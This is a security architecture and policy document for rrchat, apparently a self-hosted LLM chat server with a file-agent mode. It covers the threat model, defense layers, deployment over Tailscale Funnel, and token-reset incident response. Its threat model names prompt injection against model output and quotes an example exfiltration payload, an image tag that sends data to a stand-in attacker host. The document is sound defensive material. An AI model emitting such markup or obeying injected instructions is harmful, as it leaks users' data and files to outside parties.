# Security Architecture and Policy for rrchat

This document defines the security architecture, threat model, defense-in-depth layers, deployment models, and incident response procedures for `rrchat`.

---

## 1. Threat Model

When rrchat is exposed to local networks or the public internet via Tailscale Funnel, reverse proxies, or port forwarding, it encounters adversarial traffic.

### Attacker Capabilities & Assumptions
1. **Public URL Discovery**: An attacker can discover the public `*.ts.net` domain or IP address.
2. **Brute Force & Credential Stuffing**: An attacker can send automated requests attempting to guess access tokens or session identifiers.
3. **Malicious Web Contexts (CSRF / Rebinding / Clickjacking)**: An attacker can lure an authenticated user to an attacker-controlled website (`https://evil.com`) while rrchat is active.
4. **Prompt Injection & Indirect Data Exfiltration**: Malicious inputs or untrusted model outputs might attempt to trigger arbitrary commands, render tracking images (`<img src="https://attacker.com/leak?data=...">`), or leak local files.
5. **Slowloris & Connection Exhaustion**: Malicious clients can leave HTTP/SSE connections open indefinitely to exhaust server memory and child process slots.

### Security Guarantees (What Attackers Cannot Do)
- **Cannot brute-force access tokens**: Login endpoints enforce sliding window rate limiting (5 failed attempts per 15 minutes per IP), backed by 256-bit cryptographically secure random tokens (`crypto.randomBytes(32)`).
- **Cannot hijack sessions via script injection (XSS)**: Session cookies (`rr_session`) are marked `HttpOnly` and `SameSite=Strict`. Tokens are never stored in `localStorage`, `sessionStorage`, or `IndexedDB`.
- **Cannot perform DNS Rebinding or CSRF attacks**: Incoming `Host` headers are strictly validated against loopback, private LAN addresses, and configured domains. State-changing requests (`POST`, `PUT`, `DELETE`, `PATCH`) and SSE streams validate `Origin` and `Referer` headers.
- **Cannot access admin controls remotely**: The `/admin` web interface and all `/api/admin/*` management APIs strictly forbid remote, LAN, and proxied requests (HTTP 403 `admin_local_only`). Administrative actions are only possible directly on the host machine (`127.0.0.1` / `::1`).
- **Cannot execute arbitrary commands over public tunnels by default**: Work Mode is completely disabled over tunnels by default (HTTP 403 `work_mode_unavailable_over_tunnel`). Even if explicitly enabled by the administrator, commands cannot use saved chat approvals and require single-use HMAC-bound tokens (`nonce` + `chatId` + `cmd` hash with 5-minute TTL).
- **Cannot exfiltrate data via external Markdown images**: The frontend Markdown renderer blocks arbitrary external image URLs (`http://`, `https://`) and only permits secure local blob, data, and relative `/api/uploads/*` URLs.
- **Cannot leak tokens via logs or HTTP referrers**: Token URLs use the URL fragment (`/#token=...`), preventing tokens from appearing in reverse proxy access logs, browser history, or outbound `Referer` headers. Client-side scripts immediately strip the fragment via `history.replaceState`.

---

## 2. Defense in Depth Layers

```
Layer 1: Network Classification & Proxy Trust Boundary
         [Socket IP Check] -> [Untrusted Header Stripping] -> [Access Class Tagging]
                                     |
Layer 2: Host Header & DNS Rebinding Verification
         [Allowed Hosts List] -> Reject 403 on invalid host
                                     |
Layer 3: Authentication & Session Protection
         [Token Hash Timing-Safe Compare] -> [HttpOnly, SameSite=Strict Cookie]
                                     |
Layer 4: Browser Defenses
         [Content-Security-Policy] -> [nosniff] -> [COOP] -> [Origin / CSRF Check]
                                     |
Layer 5: Work Mode Sandboxing & Command Approvals
         [Tunnel Work Block] -> [Single-Use Approval Tokens] -> [Sandbox Boundary]
                                     |
Layer 6: Resource Management & Process Lifecycle
         [SSE Heartbeat Ping] -> [Disconnect Detection] -> [Process Tree Termination]
```

### Layer Details:
1. **Network Classification (`server/src/network.ts`)**:
   - `local`: Direct loopback socket connection, Host is localhost/127.0.0.1/[::1], no proxy headers.
   - `lan`: Connection from private subnet (10/8, 172.16/12, 192.168/16, 100.64/10, fe80::/10, fc00::/7) with no untrusted proxy headers.
   - `proxied`: Any request arriving with proxy headers or forwarded from a reverse proxy. Headers like `X-Forwarded-For` are only respected when received from a trusted loopback socket.

2. **Authentication & Session Tokens (`server/src/auth.ts`)**:
   - Secret tokens are 32 bytes of cryptographic randomness (`base64url`).
   - The server only stores the SHA-256 hash and a non-secret 6-character prefix in `config.json`.
   - Active sessions are tracked in SQLite with rolling 30-day expiration, sliding on activity.
   - Session cookies use `HttpOnly`, `SameSite=Strict`, `Path=/`, and `Secure` when transmitted over HTTPS / TLS.

3. **Admin Lockdown (`server/src/routes/admin.ts`)**:
   - All admin settings, model installations, and system inspection endpoints reject any non-local connection with 403 `admin_local_only`.

4. **Browser & Network Defenses (`server/src/security.ts`)**:
   - Strict Content Security Policy:
     `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: blob:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';`
   - `X-Content-Type-Options: nosniff`.
   - `Cross-Origin-Opener-Policy: same-origin`.
   - `Referrer-Policy: strict-origin-when-cross-origin`.
   - Origin verification on state mutations and streaming endpoints to prevent cross-site request forgery.

5. **Work Mode Isolation (`server/src/routes/work.ts`)**:
   - File agent paths are constrained to `workDir`. Traversal attempts (`..`, absolute paths, symlinks, Windows reserved devices) are rejected.
   - Work mode is blocked when requests arrive over a tunnel unless `allowWorkOverTunnel: true` is explicitly configured in `config.json`.
   - Destructive operations require cryptographic single-use approvals. Chat-level auto-approval memory is forcibly disabled over tunnels.

6. **Process Tree Lifecycle & DoS Mitigation (`server/src/routes/chats.ts`, `server/src/logger.ts`)**:
   - Active llama-server streams send 15-second heartbeat pings (`: ping\n\n`) to prevent proxy timeouts.
   - Client disconnection triggers an immediate abort signal and terminates child process trees (`taskkill /PID <pid> /T /F` on Windows; `process.kill(-pid, 'SIGTERM')` on POSIX).
   - Sensitive access tokens, session IDs, and authorization headers are scrubbed from server stdout and stderr logs.

---

## 3. Deployment Scenarios

| Scenario | Network Exposure | Access Class | Work Mode Allowed? | Required Configuration |
| :--- | :--- | :--- | :--- | :--- |
| **Localhost Only** | Host machine only | `local` | Yes (full access) | Default settings (`listenHost: "127.0.0.1"`) |
| **Home Wi-Fi LAN** | Private Home Subnet | `lan` | Yes (full access) | `listenHost: "0.0.0.0"`, connect via `http://<IP>:3000/#token=...` |
| **Tailscale Tailnet** | Private Mesh VPN | `lan` / `local` | Yes | Tailscale IP in `100.64.0.0/10` range or node hostname |
| **Tailscale Funnel** | Public Internet | `proxied` | **Disabled by default** | `listenHost: "0.0.0.0"`, configure `allowedHosts: ["node.ts.net"]` |

### Tailscale Funnel Security Notes
When exposing rrchat via Tailscale Funnel:
- The server is reachable by anyone on the internet who knows your `.ts.net` address.
- **Do not enable `allowWorkOverTunnel` unless strictly necessary.** The file agent can read, write, and execute files inside the sandbox. Exposing this functionality over public channels increases risk if an authorized session is ever left unattended on a client device.
- All administrative operations remain permanently restricted to `localhost`. You cannot modify server configurations, change model directories, or inspect host metrics through the tunnel.

---

## 4. Incident Response & Credential Recovery

If an access token is leaked, a device is lost, or an unauthorized session is suspected:

### Step 1: Emergency Token & Session Reset
Run the token reset utility directly on the host machine:
```cmd
npm run token:reset
```
This command:
1. Generates a new cryptographically random 32-byte access token.
2. Updates `config.json` with the new token hash and non-secret prefix.
3. Automatically revokes **all** active sessions in the database immediately.
4. Outputs the new connection URL and updates the local `.token` file.

### Step 2: Revoking Individual Sessions
If you only wish to disconnect a specific device:
1. Open `http://localhost:3000/admin` on the host machine.
2. Navigate to **Access Token & Devices**.
3. Inspect active sessions (User-Agent, IP address, created time, last active time).
4. Click **Revoke** on the compromised session.

### Step 3: Inspect Audit Logs
Review audit logs for suspicious login attempts or blocked requests:
1. Open the Admin Settings panel on `localhost`.
2. Scroll to **Audit Log**.
3. Export logs via the **Download audit.json** button to review failed login attempts, origin violations, or blocked tunnel requests.

---

## 5. Security Verification

Run the automated test suite and black-box verification suite to validate security controls:

```cmd
# Run unit security tests (11 automated test specifications)
npm test

# Run black-box network security verification against the server
npm run security-check
```

The black-box suite verifies:
- Unauthenticated access rejection (401)
- Invalid token rejection (401)
- Valid login and `HttpOnly` `SameSite=Strict` cookie attributes (200)
- DNS rebinding prevention via invalid Host headers (403)
- Cross-Site Request Forgery (CSRF) origin blocking (403)
- Admin localhost enforcement and remote proxy rejection (403)
- Work Mode tunnel isolation (403)
- Content Security Policy and nosniff headers

---

## 6. Vulnerability Reporting

If you identify a security vulnerability in rrchat, please do not open a public GitHub issue.

Please report the issue responsibly:
- Email the maintainers directly or use private GitHub Security Advisories.
- Include detailed reproduction steps, network capture, or proof-of-concept scripts.
- Allow reasonable time for remediation before public disclosure.
